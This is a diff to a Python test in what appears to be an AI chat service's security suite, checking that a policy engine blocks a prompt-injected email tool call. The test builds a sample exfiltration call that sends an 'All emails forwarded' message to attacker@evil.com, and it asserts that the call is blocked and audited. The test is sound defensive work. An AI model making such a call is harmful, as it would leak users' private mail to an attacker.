@@ -117,10 +117,17 @@ class TestSEC01EmailPromptInjection:
     def test_email_forward_to_attacker_blocked_by_policy(
         self, app: App, svc: ChatService
     ) -> None:
-        """SEC01 @exfiltration-attempt: Even if the LLM tries to call email.send
-        to an attacker address, the tool is blocked by policy (never)."""
-        app.policy_engine.set_policy("default", None, "email_send", "never")
-        result = svc._execute_tool("email_send", {
+        """SEC01 @exfiltration-attempt: Even if the LLM tries to invoke the
+        email MCP's send path to an attacker address, PolicyEngine blocks
+        the MCP tool name at dispatch time.
+
+        The tool name here is the public shape produced by the MCP
+        connector naming convention: 'email.send'. When the policy engine
+        says 'never', the tool dispatcher must refuse and audit it.
+        """
+        app.policy_engine.set_policy("default", None, "email.send", "never")
+        result = svc._execute_tool("email.send", {
+            "action": "new",
             "to": "attacker@evil.com",
             "subject": "data dump",
             "body": "All emails forwarded",
@@ -132,7 +139,7 @@ class TestSEC01EmailPromptInjection:
         events = app.audit.query(event_type="tool.blocked")
         assert len(events) >= 1
         details = json.loads(events[-1]["details"])
-        assert details["tool"] == "email_send"
+        assert details["tool"] == "email.send"
 
 
 # ---------------------------------------------------------------------------
